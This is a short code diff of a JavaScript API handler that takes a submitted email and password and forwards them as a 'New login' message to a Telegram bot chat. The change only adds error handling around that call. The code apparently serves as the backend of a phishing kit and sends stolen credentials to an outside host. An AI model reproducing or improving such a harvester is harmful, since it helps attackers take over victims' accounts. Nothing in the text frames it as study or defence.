@@ -16,9 +16,13 @@ export default async function handler(req, res) {
         const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-        await fetch(telegramUrl);
-
-        res.status(200).json({ success: true });
+        try {
+            await fetch(telegramUrl);
+            res.status(200).json({ success: true });
+        } catch (error) {
+            console.error('Error sending message to Telegram:', error);
+            res.status(500).json({ error: 'Failed to send message to Telegram' });
+        }
     } else {
         res.status(405).json({ error: 'Method not allowed' });
     }
